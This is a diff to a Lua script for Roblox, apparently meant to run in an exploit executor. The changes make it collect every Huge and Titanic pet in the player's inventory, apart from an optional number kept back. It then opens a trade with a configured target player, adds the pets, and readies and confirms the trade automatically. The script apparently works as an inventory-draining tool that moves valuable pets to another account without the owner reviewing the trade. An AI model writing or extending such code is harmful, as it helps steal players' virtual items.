@@ -8,13 +8,13 @@ local WaitBeforeConfirm = 4
 local AutoReady = true
 local AutoConfirm = true
 
+local config = getgenv().Config
 
-local targetPlayer = Players:FindFirstChild(Config.TargetPlayer)
+local targetPlayer = Players:FindFirstChild(config.TargetPlayer)
 if not targetPlayer then
-    warn("❌ Không tìm thấy người chơi:", Config.TargetPlayer)
+    warn("❌ Không tìm thấy người chơi:", config.TargetPlayer)
     return
 end
-
 
 local container = InventoryCmds.Container()
 if not container or not container._store or not container._store._byUID then
@@ -22,24 +22,69 @@ if not container or not container._store or not container._store._byUID then
     return
 end
 
+local hugePets, titanicPets, itemsToAdd = {}, {}, {}
 
-local itemsToAdd = {}
+-- Phân loại Huge & Titanic
 for uid, item in pairs(container._store._byUID) do
     if typeof(item) == "table" and typeof(item._stackKey) == "string" then
         local success, decoded = pcall(function()
             return HttpService:JSONDecode(item._stackKey)
         end)
         local className = item.Class and item.Class.Name
-        if success and decoded and decoded.id and className then
-            for _, wanted in ipairs(Config.WantedItems) do
-                if decoded.id == wanted.id and className == wanted.class then
-                    table.insert(itemsToAdd, {
-                        uid = item._uid or (item.GetUID and item:GetUID()),
-                        className = className,
-                        amount = item.GetAmount and item:GetAmount() or 1,
-                        name = decoded.id
-                    })
-                    break
+        local itemName = decoded and decoded.id or "Unknown"
+
+        if success and decoded and decoded.id and className == "Pet" then
+            local lowerName = string.lower(itemName)
+            local entry = {
+                uid = item._uid or (item.GetUID and item:GetUID()),
+                className = className,
+                amount = item.GetAmount and item:GetAmount() or 1,
+                name = itemName
+            }
+            if string.find(lowerName, "huge") then
+                table.insert(hugePets, entry)
+            elseif string.find(lowerName, "titanic") then
+                table.insert(titanicPets, entry)
+            end
+        end
+    end
+end
+
+
+if config.AddAllHugeTitanic then
+    local keepCount = config.KeepHugeCount or 0
+    local hugeCount = #hugePets
+    if hugeCount > keepCount then
+        for i = keepCount + 1, hugeCount do
+            table.insert(itemsToAdd, hugePets[i])
+        end
+    end
+    for _, pet in ipairs(titanicPets) do
+        table.insert(itemsToAdd, pet)
+    end
+end
+
+
+if config.WantedItems then
+    for uid, item in pairs(container._store._byUID) do
+        if typeof(item) == "table" and typeof(item._stackKey) == "string" then
+            local success, decoded = pcall(function()
+                return HttpService:JSONDecode(item._stackKey)
+            end)
+            local className = item.Class and item.Class.Name
+            local itemName = decoded and decoded.id or "Unknown"
+
+            if success and decoded and decoded.id and className then
+                for _, wanted in ipairs(config.WantedItems) do
+                    if decoded.id == wanted.id and className == wanted.class then
+                        table.insert(itemsToAdd, {
+                            uid = item._uid or (item.GetUID and item:GetUID()),
+                            className = className,
+                            amount = item.GetAmount and item:GetAmount() or 1,
+                            name = itemName
+                        })
+                        break
+                    end
                 end
             end
         end
@@ -47,17 +92,15 @@ for uid, item in pairs(container._store._byUID) do
 end
 
 if #itemsToAdd == 0 then
-    warn("❌ Không tìm thấy item/pet nào phù hợp trong kho")
+    warn("❌ Không tìm thấy Huge/Titanic Pet nào phù hợp để trade")
     return
 end
-
 
 local success = TradingCmds.Request(targetPlayer)
 if not success then
-    warn("❌ Không thể gửi yêu cầu trade tới:", Config.TargetPlayer)
+    warn("❌ Không thể gửi yêu cầu trade tới:", config.TargetPlayer)
     return
 end
-
 
 local tradeCreatedEvent = ReplicatedStorage.Network:WaitForChild("Trading: Created")
 local tradeCreated = false
@@ -81,7 +124,6 @@ if not tradeCreated then
     return
 end
 
-
 for _, obj in ipairs(itemsToAdd) do
     if obj.uid and obj.className then
         print(string.format("➡️ Add: %s | Class: %s | UID: %s | Amount: %s", obj.name, obj.className, obj.uid, obj.amount))
@@ -93,11 +135,9 @@ for _, obj in ipairs(itemsToAdd) do
     end
 end
 
-
-if Config.TradeMessage and Config.TradeMessage ~= "" then
-    TradingCmds.Message(Config.TradeMessage)
+if config.TradeMessage and config.TradeMessage ~= "" then
+    TradingCmds.Message(config.TradeMessage)
 end
-
 
 if AutoReady then
     print("⌛ Đợi " .. WaitBeforeReady .. " giây trước khi ready...")
@@ -110,7 +150,6 @@ if AutoReady then
         return
     end
 end
-
 
 if AutoConfirm then
     print("⌛ Đợi " .. WaitBeforeConfirm .. " giây trước khi confirm...")
